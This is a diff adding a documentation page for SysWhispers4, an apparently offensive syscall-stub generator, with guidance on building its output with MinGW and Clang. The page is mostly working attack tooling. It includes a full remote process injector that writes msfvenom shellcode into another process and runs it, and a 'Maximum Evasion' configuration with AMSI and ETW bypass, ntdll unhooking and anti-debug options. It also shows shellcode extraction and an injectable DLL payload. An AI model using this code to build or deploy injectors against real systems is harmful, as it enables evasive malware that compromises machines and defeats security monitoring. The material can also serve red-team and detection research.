@@ -1,0 +1,550 @@
+---
+title: 'Integration with MinGW/Clang'
+description: 'Complete guide to integrating SysWhispers4 with MinGW and Clang compilers'
+icon: 'code'
+---
+
+## Overview
+
+SysWhispers4 supports MinGW and Clang compilers using GAS (GNU Assembler) inline assembly syntax. This guide covers complete integration from generation to compilation.
+
+## Key Differences from MSVC
+
+| Aspect | MSVC | MinGW/Clang |
+|--------|------|-------------|
+| Assembly syntax | MASM (separate `.asm` file) | GAS inline (in `.c` file) |
+| Generated files | 4 files (`*.asm` separate) | 4 files (`*_stubs.c` with inline asm) |
+| Assembler | `ml64.exe` / `ml.exe` | GAS (GNU Assembler) |
+| Compiler flag | `/masm` (MASM) | `-masm=intel` |
+| Platform | Windows (MSVC toolchain) | Cross-platform (Windows/Linux host) |
+
+## Quick Integration
+
+<Steps>
+  <Step title="Generate MinGW-compatible files">
+    ```bash
+    python syswhispers.py --preset injection --compiler mingw
+    ```
+    
+    **Generated files:**
+    - `SW4Syscalls_Types.h` — NT type definitions
+    - `SW4Syscalls.h` — Function prototypes
+    - `SW4Syscalls.c` — Runtime SSN resolution
+    - `SW4Syscalls_stubs.c` — GAS inline assembly stubs (replaces `.asm`)
+  </Step>
+
+  <Step title="Create your main program">
+    **main.c:**
+    ```c
+    #include <stdio.h>
+    #include "SW4Syscalls.h"
+    
+    int main(void) {
+        if (!SW4_Initialize()) {
+            fprintf(stderr, "[!] Failed to initialize\n");
+            return 1;
+        }
+        
+        printf("[+] SysWhispers4 initialized\n");
+        
+        // Use NT functions...
+        return 0;
+    }
+    ```
+  </Step>
+
+  <Step title="Compile with MinGW">
+    ```bash
+    x86_64-w64-mingw32-gcc -masm=intel \
+        main.c SW4Syscalls.c SW4Syscalls_stubs.c \
+        -o injector.exe -lntdll
+    ```
+    
+    **Important flags:**
+    - `-masm=intel` — Use Intel assembly syntax (required)
+    - `-lntdll` — Link against ntdll (for initialization helpers)
+  </Step>
+
+  <Step title="Run the executable">
+    ```bash
+    ./injector.exe
+    ```
+    
+    Expected output:
+    ```
+    [+] SysWhispers4 initialized
+    ```
+  </Step>
+</Steps>
+
+## Complete Process Injection Example
+
+### Generate Files
+
+```bash
+python syswhispers.py --preset injection \
+    --method indirect --resolve freshycalls \
+    --compiler mingw --out-file Syscalls
+```
+
+### Source Code
+
+**injector.c:**
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include "Syscalls.h"
+
+// msfvenom -p windows/x64/exec CMD=calc.exe -f c
+unsigned char shellcode[] = {
+    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+    0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+    // ... full shellcode ...
+};
+
+int main(int argc, char* argv[]) {
+    if (argc < 2) {
+        fprintf(stderr, "Usage: %s <target_pid>\n", argv[0]);
+        return 1;
+    }
+    
+    DWORD targetPid = atoi(argv[1]);
+    printf("[*] Target PID: %lu\n", targetPid);
+    
+    // Initialize syscalls
+    if (!SW4_Initialize()) {
+        fprintf(stderr, "[!] Initialization failed\n");
+        return 1;
+    }
+    printf("[+] Initialized\n");
+    
+    // Open process
+    HANDLE hProcess = NULL;
+    OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
+    CLIENT_ID cid = { (PVOID)(ULONG_PTR)targetPid, NULL };
+    
+    NTSTATUS st = SW4_NtOpenProcess(
+        &hProcess,
+        PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
+        &objAttr,
+        &cid
+    );
+    
+    if (!NT_SUCCESS(st)) {
+        fprintf(stderr, "[!] NtOpenProcess failed: 0x%08X\n", st);
+        return 1;
+    }
+    printf("[+] Opened process: 0x%p\n", hProcess);
+    
+    // Allocate memory
+    PVOID remoteBase = NULL;
+    SIZE_T regionSize = sizeof(shellcode);
+    
+    st = SW4_NtAllocateVirtualMemory(
+        hProcess, &remoteBase, 0, &regionSize,
+        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+    );
+    
+    if (!NT_SUCCESS(st)) {
+        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", st);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Allocated %zu bytes at 0x%p\n", regionSize, remoteBase);
+    
+    // Write shellcode
+    SIZE_T written = 0;
+    st = SW4_NtWriteVirtualMemory(
+        hProcess, remoteBase, shellcode,
+        sizeof(shellcode), &written
+    );
+    
+    if (!NT_SUCCESS(st)) {
+        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", st);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Wrote %zu bytes\n", written);
+    
+    // Change protection
+    ULONG oldProtect = 0;
+    st = SW4_NtProtectVirtualMemory(
+        hProcess, &remoteBase, &regionSize,
+        PAGE_EXECUTE_READ, &oldProtect
+    );
+    printf("[+] Changed to RX\n");
+    
+    // Create thread
+    HANDLE hThread = NULL;
+    st = SW4_NtCreateThreadEx(
+        &hThread, THREAD_ALL_ACCESS, NULL,
+        hProcess, remoteBase, NULL,
+        0, 0, 0, 0, NULL
+    );
+    
+    if (!NT_SUCCESS(st)) {
+        fprintf(stderr, "[!] NtCreateThreadEx failed: 0x%08X\n", st);
+        SW4_NtClose(hProcess);
+        return 1;
+    }
+    printf("[+] Remote thread: 0x%p\n", hThread);
+    
+    // Wait and cleanup
+    SW4_NtWaitForSingleObject(hThread, FALSE, NULL);
+    SW4_NtClose(hThread);
+    SW4_NtClose(hProcess);
+    
+    printf("[+] Done\n");
+    return 0;
+}
+```
+
+### Compilation
+
+**x64 build:**
+```bash
+x86_64-w64-mingw32-gcc -masm=intel \
+    injector.c Syscalls.c Syscalls_stubs.c \
+    -o injector.exe -lntdll -O2 -s
+```
+
+**Flags explained:**
+- `-masm=intel` — Intel syntax (required for inline asm)
+- `-lntdll` — Link ntdll.dll
+- `-O2` — Optimize for speed
+- `-s` — Strip symbols (smaller binary)
+
+**x86 build (32-bit):**
+```bash
+i686-w64-mingw32-gcc -masm=intel \
+    injector.c Syscalls.c Syscalls_stubs.c \
+    -o injector_x86.exe -lntdll -O2 -s
+```
+
+### Build Output
+
+```bash
+$ x86_64-w64-mingw32-gcc -masm=intel injector.c Syscalls.c Syscalls_stubs.c -o injector.exe -lntdll
+$ ls -lh injector.exe
+-rwxr-xr-x 1 user user 67K Jan 15 10:23 injector.exe
+```
+
+## Cross-Compilation from Linux
+
+### Install MinGW on Linux
+
+**Debian/Ubuntu:**
+```bash
+sudo apt update
+sudo apt install mingw-w64
+```
+
+**Arch Linux:**
+```bash
+sudo pacman -S mingw-w64-gcc
+```
+
+**Fedora/RHEL:**
+```bash
+sudo dnf install mingw64-gcc mingw32-gcc
+```
+
+### Generate and Compile
+
+```bash
+# Generate files
+python syswhispers.py --preset common --compiler mingw
+
+# Cross-compile for Windows x64
+x86_64-w64-mingw32-gcc -masm=intel \
+    example.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o example.exe -lntdll
+
+# Transfer example.exe to Windows and run
+```
+
+## Using Clang
+
+### Generate for Clang
+
+```bash
+python syswhispers.py --preset injection --compiler clang
+```
+
+**Note:** Output is identical to MinGW (GAS inline assembly). Clang uses the same syntax.
+
+### Compile with Clang
+
+**Windows (with Clang installed):**
+```bash
+clang -target x86_64-pc-windows-gnu -masm=intel \
+    main.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o example.exe -lntdll
+```
+
+**Linux cross-compile:**
+```bash
+clang -target x86_64-w64-mingw32 -masm=intel \
+    main.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o example.exe -lntdll
+```
+
+## Makefile Example
+
+**Makefile:**
+```makefile
+CC = x86_64-w64-mingw32-gcc
+CFLAGS = -masm=intel -O2 -Wall -Wextra
+LDFLAGS = -lntdll -s
+
+TARGET = injector.exe
+SOURCES = injector.c Syscalls.c Syscalls_stubs.c
+OBJECTS = $(SOURCES:.c=.o)
+
+.PHONY: all clean
+
+all: $(TARGET)
+
+$(TARGET): $(OBJECTS)
+	$(CC) $(OBJECTS) -o $@ $(LDFLAGS)
+
+%.o: %.c
+	$(CC) $(CFLAGS) -c $< -o $@
+
+clean:
+	rm -f $(OBJECTS) $(TARGET)
+
+generate:
+	python syswhispers.py --preset injection --method indirect \
+		--resolve freshycalls --compiler mingw --out-file Syscalls
+```
+
+**Usage:**
+```bash
+# Generate syscall files
+make generate
+
+# Build project
+make
+
+# Clean build artifacts
+make clean
+```
+
+## Advanced Configurations
+
+### Maximum Evasion
+
+```bash
+python syswhispers.py --preset stealth \
+    --method randomized --resolve recycled \
+    --obfuscate --encrypt-ssn --stack-spoof \
+    --etw-bypass --amsi-bypass --unhook-ntdll \
+    --anti-debug --sleep-encrypt \
+    --compiler mingw
+```
+
+**Compile:**
+```bash
+x86_64-w64-mingw32-gcc -masm=intel \
+    payload.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o payload.exe -lntdll -O2 -s -ffunction-sections -fdata-sections \
+    -Wl,--gc-sections
+```
+
+**Additional flags:**
+- `-ffunction-sections` — Separate functions into sections
+- `-fdata-sections` — Separate data into sections
+- `-Wl,--gc-sections` — Remove unused sections (smaller binary)
+
+### Shellcode Generation
+
+Compile as position-independent code for shellcode conversion:
+
+```bash
+x86_64-w64-mingw32-gcc -masm=intel \
+    -fPIC -fno-stack-protector -nostdlib \
+    -Wl,--entry=main \
+    shellcode.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o shellcode.exe -lntdll
+```
+
+Extract shellcode:
+```bash
+objcopy -O binary --only-section=.text shellcode.exe shellcode.bin
+```
+
+### Static Linking
+
+Create fully self-contained executable:
+
+```bash
+x86_64-w64-mingw32-gcc -masm=intel -static \
+    main.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o static_injector.exe -O2 -s
+```
+
+**Note:** Binary size will be much larger (~1-2 MB vs ~50 KB).
+
+## DLL Creation
+
+### Generate Files
+
+```bash
+python syswhispers.py --preset common --compiler mingw
+```
+
+### DLL Source
+
+**payload.c:**
+```c
+#include <windows.h>
+#include "SW4Syscalls.h"
+
+__attribute__((constructor))
+void on_load(void) {
+    // Initialize syscalls
+    if (!SW4_Initialize()) {
+        return;
+    }
+    
+    // Your payload here
+    MessageBoxA(NULL, "Injected via MinGW!", "Success", MB_OK);
+}
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
+    if (fdwReason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hinstDLL);
+    }
+    return TRUE;
+}
+```
+
+### Compile DLL
+
+```bash
+x86_64-w64-mingw32-gcc -masm=intel -shared \
+    payload.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o payload.dll -lntdll -O2 -s
+```
+
+**Output:** `payload.dll` ready for injection
+
+## Troubleshooting
+
+### Error: "operand type mismatch for 'syscall'"
+
+**Cause:** x64 instruction in x86 build.
+
+**Solution:**
+- Ensure you're using x64 compiler: `x86_64-w64-mingw32-gcc`
+- Or regenerate with `--arch x86` for 32-bit
+
+### Error: "undefined reference to 'SW4_NtAllocateVirtualMemory'"
+
+**Cause:** Missing `SW4Syscalls_stubs.c` in compilation.
+
+**Solution:**
+```bash
+# Include ALL 3 .c files:
+x86_64-w64-mingw32-gcc -masm=intel \
+    main.c SW4Syscalls.c SW4Syscalls_stubs.c \
+    -o output.exe -lntdll
+```
+
+### Error: "Bad value (intel) for -masm= switch"
+
+**Cause:** Old GCC version (< 4.9).
+
+**Solution:**
+- Update MinGW: `sudo apt install --upgrade mingw-w64`
+- Or remove `-masm=intel` (uses AT&T syntax — not recommended)
+
+### Warning: "implicit declaration of function 'GetModuleHandleA'"
+
+**Cause:** Missing Windows header.
+
+**Solution:**
+```c
+#include <windows.h>  // Add to top of file
+```
+
+### Initialization Fails on Wine
+
+**Symptoms:** `SW4_Initialize()` returns FALSE when running under Wine.
+
+**Cause:** Wine's ntdll implementation differs from Windows.
+
+**Solution:**
+- Use `--resolve static` (embeds SSN table, no runtime parsing)
+- Or test on real Windows (Wine compatibility not guaranteed)
+
+## Comparison: MinGW vs MSVC
+
+### Binary Size
+
+| Configuration | MSVC | MinGW |
+|--------------|------|-------|
+| Debug | ~120 KB | ~85 KB |
+| Release (stripped) | ~45 KB | ~50 KB |
+| Static link | N/A | ~1.5 MB |
+
+### Performance
+
+Nearly identical — syscall overhead dominates (assembly is the same).
+
+### Compatibility
+
+- **MSVC:** Windows-only (Visual Studio required)
+- **MinGW:** Cross-platform (compile from Linux/macOS)
+
+### Debugging
+
+- **MSVC:** Full Visual Studio debugger integration
+- **MinGW:** GDB (command-line or IDE integration)
+
+## Best Practices
+
+1. **Always include `-masm=intel`:**
+   ```bash
+   x86_64-w64-mingw32-gcc -masm=intel ...
+   ```
+
+2. **Link ntdll for initialization helpers:**
+   ```bash
+   ... -lntdll
+   ```
+
+3. **Use optimization for smaller binaries:**
+   ```bash
+   ... -O2 -s
+   ```
+
+4. **Strip symbols in production:**
+   ```bash
+   ... -s
+   ```
+   Or after compilation:
+   ```bash
+   strip injector.exe
+   ```
+
+5. **Check NTSTATUS values:**
+   ```c
+   NTSTATUS st = SW4_NtAllocateVirtualMemory(...);
+   if (!NT_SUCCESS(st)) {
+       fprintf(stderr, "Failed: 0x%08X\n", st);
+   }
+   ```
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="MSVC Integration" icon="microsoft" href="/guides/integration-msvc">
+    Alternative: Visual Studio integration
+  </Card>
+  <Card title="Advanced Evasion" icon="shield-halved" href="/guides/advanced-evasion">
+    Learn about all evasion techniques
+  </Card>
+</CardGroup>
